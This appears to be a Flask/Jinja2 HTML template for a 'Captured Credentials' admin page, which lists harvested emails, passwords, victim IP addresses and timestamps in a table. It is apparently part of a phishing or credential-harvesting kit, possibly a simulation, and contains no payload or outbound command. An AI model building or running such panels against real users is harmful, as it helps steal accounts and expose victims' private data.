<!DOCTYPE html>
<html>
<head>
    <title>Captured Credentials</title>
</head>
<body>
    <h2>Captured Credentials</h2>
    <a href="{{ url_for('logout') }}">Logout</a>
    <table border="1" cellpadding="5">
        <tr>
            <th>Email</th>
            <th>Password</th>
            <th>IP</th>
            <th>Timestamp</th>
        </tr>
        {% for row in data %}
        <tr>
            <td>{{ row[0] }}</td>
            <td>{{ row[1] }}</td>
            <td>{{ row[2] }}</td>
            <td>{{ row[3] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
